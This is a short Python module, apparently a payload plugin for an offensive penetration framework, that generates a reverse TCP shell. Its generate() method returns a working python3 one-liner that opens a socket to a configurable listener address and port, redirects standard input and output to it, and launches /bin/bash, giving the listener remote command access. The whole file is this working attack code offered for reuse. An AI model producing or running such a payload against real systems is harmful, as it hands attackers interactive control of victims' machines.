from deathnote_module import *


class Module(Payload):
	
	__info__ = {
			'name': 'Unix Command Shell, Reverse TCP (via Python)',
			'description': 'Connect back and create a command shell via Python',
			'category': 'singles',
			'arch': 'python',
			'handler': 'listeners/multi/reverse_tcp',
			'type': 'reverse'
		}

	lhost = OptString('127.0.0.1', 'Connect to IP address', 'yes', False)
	lport = OptPort(5555, 'Bind Port', 'yes', False)
	shell_binary = OptString('/bin/bash', 'The system shell in use', 'yes', True)
	python_binary = OptString("python3", "Python binary version", 'yes', False)
	encoder = OptString("", "Encoder", "no", True)


	def generate(self):
		raw_cmd = f"import socket,subprocess,os;host='{self.lhost}';port={self.lport};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call('{self.shell_binary}')"

		return f"{self.python_binary} -c \"{raw_cmd}\""
